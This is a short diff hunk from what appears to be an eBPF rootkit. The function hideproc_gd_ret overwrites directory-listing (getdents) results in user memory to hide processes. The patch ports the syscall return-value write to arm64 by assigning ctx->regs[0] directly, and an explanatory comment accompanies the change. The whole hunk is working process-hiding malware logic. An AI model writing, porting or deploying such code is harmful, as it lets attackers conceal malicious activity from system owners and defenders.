@@ -678,6 +678,8 @@ int hideproc_gd_ret(struct pt_regs *ctx)
     if (bpf_probe_write_user((void *)gctx->dirp, buf, new_off))
         return 0;
 
-    PT_REGS_RC(ctx) = new_off;
+    /* arm64: syscall return value lives in regs[0]; PT_REGS_RC macro
+     * expands read-only in this libbpf version, so write it directly. */
+    ctx->regs[0] = new_off;
     return 0;
 }
